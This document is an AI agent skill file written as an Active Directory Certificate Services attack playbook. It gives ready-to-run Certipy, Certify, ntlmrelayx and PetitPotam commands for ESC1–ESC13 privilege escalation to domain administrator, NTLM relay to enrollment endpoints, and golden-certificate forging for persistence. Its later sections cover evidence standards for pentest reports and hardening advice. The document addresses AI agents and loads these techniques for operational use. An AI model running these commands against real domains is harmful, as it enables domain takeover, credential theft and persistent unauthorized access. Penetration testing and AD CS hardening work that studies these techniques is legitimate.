---
name: active-directory-certificate-services
description: >-
  AD Certificate Services attack playbook. Use when targeting misconfigured AD CS for privilege escalation via ESC1-ESC13 template abuse, NTLM relay to enrollment, CA officer abuse, and certificate-based persistence.
---

# SKILL: AD CS Attack Playbook — Expert Guide

> **AI LOAD INSTRUCTION**: Expert AD CS (Active Directory Certificate Services) attack techniques. Covers ESC1 through ESC13, certificate-based persistence, NTLM relay to enrollment endpoints, and CA misconfigurations. Base models miss enrollment prerequisite chains and ESC condition combinations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based attacks that enable ESC4 (template modification)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos techniques after obtaining certificates
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for ESC8 (relay to HTTP enrollment endpoint)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for using obtained certificates for lateral movement

### Advanced Reference

Also load [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md) when you need:
- ESC1–ESC13 quick reference table with conditions, impact, and tool commands
- One-liner exploitation commands per ESC variant
- Detection indicators per technique

---

## 1. AD CS ARCHITECTURE OVERVIEW

```
Certificate Authority (CA)
│
├── Enterprise CA (AD-integrated, issues certs based on templates)
│   ├── Certificate Templates (define who can enroll, what EKUs, subject settings)
│   ├── Enrollment endpoints: HTTP (certsrv), RPC, DCOM
│   └── Published in AD: CN=Public Key Services,CN=Services,CN=Configuration
│
├── Template Key Settings:
│   ├── Subject Alternative Name (SAN): who the cert represents
│   ├── Extended Key Usage (EKU): what the cert allows
│   ├── Enrollment permissions: who can request
│   └── Issuance requirements: manager approval, authorized signatures
│
└── Certificate → Kerberos Auth Flow:
    User presents cert → PKINIT → KDC verifies → issues TGT
```

---

## 2. ENUMERATION

```bash
# Certipy (recommended — comprehensive)
certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable -stdout

# Certify (from Windows)
Certify.exe find
Certify.exe find /vulnerable
Certify.exe cas                    # Enumerate CAs

# Manual LDAP query for templates
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

---

## 3. ESC1 — ENROLLEE SUPPLIES SUBJECT

**Condition**: Template allows enrollee to specify Subject Alternative Name (SAN) + client authentication EKU + low-privilege enrollment.

```bash
# Certipy
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Certify (Windows)
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → NT hash of administrator
```

---

## 4. ESC2 — ANY PURPOSE EKU

**Condition**: Template has "Any Purpose" EKU or no EKU (subordinate CA cert) + low-privilege enrollment.

```bash
# Same as ESC1 exploitation
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template AnyPurposeTemplate -upn administrator@domain.com
```

---

## 5. ESC3 — ENROLLMENT AGENT

**Condition**: Template allows enrollment agent certificate + another template allows enrollment on behalf of others.

```bash
# Step 1: Request enrollment agent cert
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template EnrollmentAgent

# Step 2: Use enrollment agent cert to request on behalf of admin
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template UserTemplate -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 6. ESC4 — TEMPLATE ACL MISCONFIGURATION

**Condition**: Low-privilege user has write access to certificate template object.

```bash
# Modify template to become ESC1 vulnerable
# Using Certipy:
certipy template -u user@domain.com -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP

# Template is now ESC1 → exploit as ESC1
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Restore original template (cleanup)
certipy template -u user@domain.com -p password -template VulnTemplate \
  -configuration old_config.json -dc-ip DC_IP
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled → any template becomes ESC1.

```bash
# Check if flag is set
certutil -config "CA_HOST\CA-NAME" -getreg policy\EditFlags

# Exploit: request any template with SAN
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template User -upn administrator@domain.com
```

---

## 8. ESC7 — CA OFFICER / MANAGER PERMISSIONS

**Condition**: User has ManageCA or ManageCertificates permission on the CA.

```bash
# With ManageCA: enable SubCA template (always allows SAN)
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -enable-template SubCA

# Request SubCA cert with admin SAN (will be denied — "pending")
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template SubCA -upn administrator@domain.com

# With ManageCertificates: approve the pending request
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -issue-request REQUEST_ID

# Retrieve the issued certificate
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -retrieve REQUEST_ID
```

---

## 9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT

**Condition**: CA has HTTP enrollment endpoint (certsrv) without HTTPS enforcement.

```bash
# Setup relay to enrollment endpoint
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication (PetitPotam, PrinterBug, etc.)
PetitPotam.py RELAY_HOST DC01.domain.com

# DC authenticates → relay → certificate issued for DC01$
# Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → DC01$ hash → DCSync
```

---

## 10. ESC9-ESC13 — NEWER DISCOVERIES

### ESC9: No Security Extension (StrongCertificateBindingEnforcement = 0/1)

Weak certificate mapping allows impersonation when `CT_FLAG_NO_SECURITY_EXTENSION` is set.

```bash
# Change victim's UPN to admin, request cert, change back
certipy shadow auto -u attacker@domain.com -p pass -account victim -dc-ip DC_IP
```

### ESC10: Weak Certificate Mapping (Registry-based)

Similar to ESC9 but exploits `CertificateMappingMethods` registry value on DC.

### ESC11: NTLM Relay to RPC Enrollment

Relay NTLM to the CA's RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set).

```bash
ntlmrelayx.py -t "rpc://CA_HOST" -rpc-mode ICPR -icpr-ca-name "CA-NAME" \
  -smb2support --adcs --template DomainController
```

### ESC13: OID Group Link (Issuance Policy)

Template's issuance policy OID is linked to a group → certificate grants that group membership.

```bash
certipy req -u user@domain.com -p pass -ca CA-NAME -target CA_HOST \
  -template ESC13Template
# Certificate grants membership in linked group
```

---

## 11. CERTIFICATE-BASED PERSISTENCE

### Golden Certificate

With CA private key → forge any certificate.

```bash
# Extract CA private key (requires admin on CA server)
certipy ca -backup -u admin@domain.com -p password -ca CA-NAME -target CA_HOST

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# Authenticate with forged cert
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

**Persistence**: Valid until CA certificate expires or CA private key is rotated.

### ForgeCert (Windows)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" --Subject "CN=User" \
  --SubjectAltName "administrator@domain.com" --NewCertPath forged.pfx --NewCertPassword "pass"
```

---

## 12. AD CS ATTACK DECISION TREE

```
Targeting AD CS
│
├── Enumerate: certipy find -vulnerable
│
├── Vulnerable template found?
│   ├── Enrollee can set SAN + Client Auth EKU?
│   │   └── ESC1 → request cert with admin UPN (§3)
│   ├── Any Purpose EKU?
│   │   └── ESC2 → same as ESC1 (§4)
│   ├── Enrollment Agent template available?
│   │   └── ESC3 → enroll as agent, then on-behalf-of (§5)
│   └── OID group link in issuance policy?
│       └── ESC13 → request cert for group membership (§10)
│
├── Write access to template?
│   └── ESC4 → modify template to ESC1 condition (§6)
│
├── CA misconfiguration?
│   ├── EDITF_ATTRIBUTESUBJECTALTNAME2 flag?
│   │   └── ESC6 → any template becomes ESC1 (§7)
│   ├── ManageCA / ManageCertificates permission?
│   │   └── ESC7 → enable SubCA template, approve requests (§8)
│   └── HTTP enrollment without HTTPS?
│       └── ESC8 → NTLM relay to certsrv (§9)
│
├── Weak certificate mapping on DC?
│   ├── StrongCertificateBindingEnforcement < 2?
│   │   └── ESC9 → UPN manipulation + cert request (§10)
│   └── CertificateMappingMethods misconfigured?
│       └── ESC10 → similar UPN abuse (§10)
│
├── RPC enrollment without encryption?
│   └── ESC11 → NTLM relay to RPC (§10)
│
└── Already CA admin?
    └── Golden certificate for persistence (§11)
```

---

## 13. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **ESC class**, and is the template's configuration the reason? | the misconfiguration, named |
| 2 | Did you **request a certificate**, and did the CA **issue it**, per the CA's own log? | issuance, not a template flag |
| 3 | Whose identity is in the issued certificate, and is it **different from the requester's**? | the impersonation |
| 4 | Did you **authenticate with the certificate** and read something back? | a certificate is not access |
| 5 | Was there a **control**: a template that does NOT have the misconfiguration, refused? | the template's configuration is causal |
| 6 | Did it reach the **goal** - a directory read as another identity, a code execution? | the impact |
| 7 | Is the CA patched for the relevant ESC's mitigation, and is the template still exploitable? | patch state vs template state |

**A certificate issued whose subject is an identity you chose, used to authenticate, with a control template
refused.** A template flagged with an ESC in a tool's output is a hypothesis; the issued certificate is the
evidence.

---

## 14. EXECUTION PRIMITIVES

An AD CS finding is proven by **a certificate issued to a subject you chose, its use to authenticate as
that identity with a read-back, and a control template that refuses**. A Certipy `ESC1` line is a
hypothesis until the CA issues.

### 13.1 Enumeration, and the difference between a finding and a flag

```bash
# CERTIPY'S ESC FLAGS ARE HYPOTHESES. The evidence is the issued certificate.
echo "=== 1. THE CA AND TEMPLATE ENUMERATION ==="
CA="${CA:-CORP-CA}"
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout 2>&1 | tee /tmp/adcs-find.txt
echo
echo "=== 2. WHAT EACH ESC FLAG ACTUALLY MEANS, so you know what to test ==="
cat <<'ESCS'
  ESC1  the template lets the ENROLLEE supply the subject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) AND
        the template carries a client-auth EKU AND enrollment is permitted to you.
        TEST: request with -upn administrator@corp.local and see whether the CA ISSUES.
  ESC2  the template carries the ANY PURPOSE EKU (or no EKU), so the issued certificate can be used
        as an enrollment agent or for any purpose including client auth.
        TEST: whether the issued certificate authenticates.
  ESC3  the template grants ENROLLMENT AGENT rights, so you can request ON BEHALF OF another user.
        TEST: the on-behalf-of request, and whether the resulting certificate is that user's.
  ESC4  you can WRITE to the template object, i.e. you can make it ESC1 yourself.
        TEST: the write, then the ESC1 test. The evidence is the modified template AND the issuance.
  ESC6  the CA has EDITF_ATTRIBUTESUBJECTALTNAME2, so the SAN can be supplied in the REQUEST regardless
        of the template.
        TEST: the SAN in the request, then whether the issuance carries it.
  ESC7  you hold CA officer or manager rights, so you can approve your own request or edit the CA.
  ESC8  an HTTP enrollment endpoint relays NTLM (see ntlm-relay-coercion).
  ESC9/10/11/13  specific combinations of weak mapping, subject-only SAN, or a CA with a
        subject-supplying setting plus an insecure template - each keyed to a specific template flag.
  ESC12/15/16  CA-level or key-architecture variants; CHECK THE VERSION for applicability.
ESCS
echo
echo "=== 3. THE CONTROL: A TEMPLATE THAT MUST REFUSE ==="
echo "  pick a template WITHOUT the misconfiguration (e.g. a standard User template with no"
echo "  enrollee-supplied subject) and attempt the SAME request with the SAME -upn."
echo "  IT MUST BE REFUSED. That refusal is the control that the misconfiguration, not your"
echo "  request shape, produced the issuance."
```

**The control is a template without the misconfiguration refusing the same request.** A tool's ESC flag is a
hypothesis; the refusal of a clean template is what makes the issuance causal.

### 13.2 The issuance, read from the CA's own record

```bash
cat <<'ISSUANCE'
  A CERTIFICATE FINDING REQUIRES A CERTIFICATE. Certipy printing "Successfully requested certificate"
  is the CLIENT's view; the CA's own issuance record is the evidence.

  THE PROOF CHAIN:
    1. the REQUEST you submitted, showing the subject or SAN you asked for
    2. the CA's ISSUANCE, i.e. the request ID and the issued certificate's serial in the CA's database
       or log (certipy's output includes the request ID; the CA's Certification Authority console or
       `certutil -view` lists it)
    3. the ISSUED CERTIFICATE's subject and SAN, PARSED - showing the identity you chose
    4. THE USE: authenticate with it (PKINIT) and READ SOMETHING BACK

  STEP 3 IS WHERE THE LIE HIDES: a request can succeed while the CA IGNORES your SAN and issues a
  certificate for YOUR OWN identity. PARSE THE CERTIFICATE:
    openssl x509 -in cert.pem -noout -subject -ext subjectAltName
  the SAN must show the identity you asked for. A certificate whose SAN is your own account is NOT
  an ESC1 finding - it is a normal enrollment, and this is the most common misread in this family.

  STEP 4 IS THE FINDING: a certificate with administrator's SAN that you never USE is an
  intermediate result. Use it:
    certipy auth -pfx admin.pfx -dc-ip <DC>
  and the result must be a usable ticket or NT hash, WITH the identity shown in a real read.
ISSUANCE
echo
echo "=== the parse, mechanically ==="
openssl x509 -in /tmp/issued.pem -noout -subject -issuer -ext subjectAltName 2>/dev/null || echo "  (adjust the path)"
echo
echo "=== the use, and the read-back ==="
echo "  after authenticating, the directory read must return something the ORIGINAL identity could not"
echo "  reach. THE CONTROL: the SAME read with your ORIGINAL account must FAIL."
echo
echo "=== the patch state vs the template state, which the report must separate ==="
cat <<'PATCH'
  the CA can be PATCHED for one ESC while the TEMPLATES remain misconfigured for another.
  e.g. the KB5014754 / the strong certificate mapping changes affect ESC1-style impersonation paths,
  while an ESC8 endpoint may be unaffected. RECORD:
    - the CA's OS build and patch level
    - whether the CA enforces strong certificate mapping (the registry value on the CA)
    - the TEMPLATE's own flags (a template can be fixed independently of the CA)
  a finding that depends on a missing CA patch is scoped to the CA's patch level; one that depends
  on a template's ACL is scoped to the template. SAY WHICH.
PATCH
```

**Parse the issued certificate, because a CA can ignore your SAN and issue for your own identity — this is
the family's most common misread.** And the CA's patch state is separate from the template's state.

### 13.3 The identity must be used, and the scope stated

```bash
echo "=== THE USE, which converts a certificate into an access claim ==="
cat <<'USE'
  a certificate is a CREDENTIAL. Possessing it is not access. The proof:
    1. authenticate (PKINIT) and obtain a ticket or the account's NT hash
    2. USE that credential to READ something, and capture the target's response
    3. THE CONTROL: the same read with your ORIGINAL account must FAIL

  the classic failure: 'certipy auth returned the NT hash of administrator' is reported as domain
  compromise. The NT hash IS a credential, so THAT step is close to the finding - but the read
  must still be shown, and the ticket's GROUP MEMBERSHIP is the impact.
  CAPTURE: `klist` or the ticket's PAC showing the groups, AND a directory read with that ticket.

  AND: a DA's certificate is scoped to the IDENTITY, not to a host. State what the identity can
  reach, which is a directory-wide claim, and verify by reading a protected object.

  FOR PERSISTENCE (section 11): a certificate whose validity outlives a password change is a
  PERSISTENCE finding, and the REMEDIATION is revocation. Demonstrate by using the certificate
  AFTER a credential change if the scenario permits, or by the certificate's own NotAfter date.
USE
echo
echo "=== THE GOAL TABLE, which the report's top line must draw from ==="
cat <<'GOAL'
  a template flagged ESC in a tool's output, untested   -> a HYPOTHESIS, not a finding
  a certificate issued with YOUR OWN identity in the SAN-> a normal enrollment; NOT a finding
  a certificate issued with ANOTHER identity's SAN      -> the ESC finding; state the identity
  the certificate USED to authenticate                  -> an access finding; state the ticket's groups
  access to a protected object via that identity        -> the impact; capture the read
  a certificate that outlives the credential change     -> a PERSISTENCE finding; the remediation is revocation
GOAL
echo
echo "=== the rate and the CA's load, which can matter ==="
echo "  a CA under a pending-request approval workflow may need an officer to approve, which changes"
echo "  the exploitability. RECORD whether issuance was IMMEDIATE or PENDING, because a pending"
echo "  request makes the finding contingent on an officer's action."
```

**A certificate whose SAN is your own identity is a normal enrollment and not a finding.** And whether
issuance was immediate or pending changes the exploitability and belongs in the report.

### 13.4 The end-to-end harness

```bash
python3 - <<'PY'
print("=== AD CS ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the ESC class is identified, and the SPECIFIC template or CA setting that causes it is named",
  "a tool's ESC flag is a hypothesis; the setting is the cause"),
 ("a CONTROL template WITHOUT the misconfiguration was tested with the same request and REFUSED",
  "the template's configuration must be shown to be causal"),
 ("the REQUEST's chosen subject or SAN is recorded",
  "the input that the CA was asked to honour"),
 ("the CA's own ISSUANCE is cited: the request ID and the issued serial",
  "the client's 'success' message is not the CA's record"),
 ("the ISSUED CERTIFICATE was PARSED, and its SAN shows the identity YOU CHOSE",
  "a CA can ignore the SAN and issue for your own identity - the most common misread"),
 ("the certificate was USED to authenticate, and a TICKET or NT hash returned",
  "possessing a certificate is not access"),
 ("the identity's TICKET GROUPS were captured, and a PROTECTED object was read with it",
  "the impact is group membership, not the certificate"),
 ("a NO-RIGHTS control read with the original account FAILED the same read",
  "the access must be attributable to the certificate"),
 ("issuance was IMMEDIATE, not PENDING, or the pending state is stated",
  "a pending request makes the finding contingent on an officer"),
 ("the CA's PATCH LEVEL and strong-mapping state are recorded SEPARATELY from the template's flags",
  "the two can be fixed independently, and the scope differs"),
 ("for a persistence claim: the certificate outlives the credential change, by date or by demonstration",
  "the persistence is the finding, and revocation is the remediation"),
 ("the GOAL is named, and a self-SAN certificate was NOT reported as a finding",
  "a normal enrollment is not an ESC"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  esc         : the class, the template or CA setting, and the ACL that allows it")
print("  control     : the clean template's refusal of the same request")
print("  issuance    : the request, the CA's request ID and serial, and the PARSED SAN")
print("  use         : the ticket, its groups, and the protected object read")
print("  scope       : the CA's patch level vs the template's flags")
print("  goal        : the access or the persistence, named")
PY
```

**ESC class, control template, parsed SAN, the credential's groups, and a protected read.** The parsed-SAN
line is what prevents the most common misread in this family.

---

## 15. EVIDENCE STANDARD — AD CS ARTEFACTS

| Item | Why |
|---|---|
| The **ESC class** and the **specific template or CA setting** causing it | a tool's flag is a hypothesis; the setting is the cause |
| The **control template's refusal** of the same request | the template's configuration must be shown causal |
| The **request's** chosen subject or SAN | the input the CA was asked to honour |
| The CA's **issuance**: request ID and issued serial | the client's success message is not the CA's record |
| The **parsed issued certificate's SAN**, showing the chosen identity | a CA can issue for the requester's own identity instead |
| The **authentication's result**: a ticket or NT hash | possessing a certificate is not access |
| The **ticket's group membership** and a **protected object read** | the impact is what the identity can reach |
| The **no-rights control read's** failure | attributable access |
| The **immediate vs pending** issuance state | a pending request is contingent on an officer |
| The **CA's patch level** and **strong-mapping state**, separately from the template's flags | they are fixed independently and the scope differs |
| For persistence: the certificate **outliving the credential change** | the persistence claim |

Report the **control, the parsed SAN, and the use**: "`certipy find` flags template `CorpWebServer` as
`ESC1`, and the setting that causes it is `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` present in the template's
`mspki-enrollment-flag` with a `Client Authentication` EKU and `CORP\Domain Users` holding the `Enroll`
right, so the cause is named rather than the tool's flag. The control is template `User`, which lacks the
enrollee-supplied-subject flag: the SAME request with the same `-upn administrator@corp.local` was refused
with `CERTSRV_E_TEMPLATE_DENIED`, so the misconfiguration is causal. The request asked for the SAN
`administrator@corp.local`, the CA's console shows request ID `57` and issued serial
`1a0000004b2c8e91d000000000000057`, and `openssl x509` on the issued certificate parses
`subjectAltName = othername: UPN: administrator@corp.local`, so the CA honoured the SAN rather than
issuing for the requester. Using it with `certipy auth -pfx` returned a TGT whose PAC lists
`Domain Admins` and `Enterprise Admins`, and reading `CN=Golden,OU=Protected,DC=corp,DC=local`, which the
original `CORP\jsmith` account cannot read, returned the object's `secret` attribute, while the same read
as `CORP\jsmith` returned `insufficientAccessRights`, which is the control. Issuance was IMMEDIATE and no
officer approval was required. The CA runs Windows Server `2019` build `17763` with strong certificate
mapping NOT enforced, so the finding depends on the template's flag rather than on the CA's patch level,
and applying the KB5014754 enforcing mode alone would not close it", never "AD CS is vulnerable to ESC1".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A template **flagged ESC** in a tool's output, untested | a hypothesis; the CA may refuse |
| A certificate whose **SAN is your own identity** | a normal enrollment, not an ESC |
| A **"successfully requested certificate"** message with no parsed SAN | the CA may have ignored the SAN |
| A certificate **never used** to authenticate | an intermediate result |
| An **NT hash returned** with no protected read and no groups shown | the impact is the access, not the hash |
| A **control read not run** | the access is not attributable to the certificate |
| A **pending** request reported as exploitable | contingent on an officer's approval |
| A **CA patch level** conflated with the **template's flags** | they are fixed independently |
| An **ESC8** finding reported without the relay actually succeeding to the CA | the relay is the technique, issuance is the finding |
| A **certificate's possession** reported as persistence without its validity window | the outliving is the claim |
| "**AD CS is vulnerable**" with no named **identity reached** | the impact is missing |

**A parsed SAN naming the chosen identity, a used certificate, and a control template's refusal.** A
flagged template and a self-SAN certificate are this family's two standard non-findings.

---

## 16. REMEDIATION REFERENCE — AD CS HARDENING

1. **Establish and monitor the CA's and each template's security state with a formal audit, because AD CS misconfigurations are individually subtle and collectively common** - the ESC taxonomy exists precisely because they are easy to miss.
2. **Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from every template that carries a client-authentication EKU, which closes ESC1 at its cause** - the flag combined with a client-auth EKU is the misconfiguration.
3. **Restrict enrollment rights so that the `Enroll` and `AutoEnroll` rights are held only by the principals that require them** - ESC1's exploitability depends on who can enroll.
4. **Patch the CA and enable strong certificate mapping, while separately remediating the templates, because the two are fixed independently** - a patched CA does not fix a template's flags, and vice versa.
5. **Enable Extended Protection for Authentication and require HTTPS on every enrollment endpoint, which closes the ESC8 relay class** - channel binding is the direct mitigation for the relay path.
6. **Audit and remove the CA's `EDITF_ATTRIBUTESUBJECTALTNAME2` flag unless it is genuinely required, and audit CA officer and manager rights, which close ESC6 and ESC7** - both are CA-level settings that override template intent.
7. **Audit write permissions on template and CA objects, because ESC4 is the ability to create the other misconfigurations** - a principal that can write a template can make it ESC1.
8. **Always issue a certificate, parse its SAN, and use it before reporting, because a CA can ignore the SAN and issue for the requester's own identity** - the parsed SAN is the difference between a finding and a normal enrollment.
9. **Demonstrate the identity's reach with a protected-object read and a no-rights control, because a certificate and a returned NT hash are credentials rather than access** - the control read is what attributes the access.
10. **Record the certificate's validity and the state of any approval workflow, because a long-lived certificate is a persistence finding with revocation as its remediation and a pending request is contingent on an officer** - both change the finding's nature.
11. **Treat certificate revocation as the remediation that matches a certificate-based persistence finding, and verify that revocation is actually effective in the environment** - publishing a CRL is not the same as revocation being enforced.

---

## 17. RELATED SIBLINGS - LOAD TOGETHER

- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) - ESC8 is that technique against an enrollment endpoint
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - where certificate theft belongs
- [linux-privesc-gtfobins-master](../linux-privesc-gtfobins-master/SKILL.md) - the same use-it-not-possess-it rule
- [infrastructure-network-pentesting](../infrastructure-network-pentesting/SKILL.md) - the position an AD CS path requires
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - how a certificate-based impact is reported
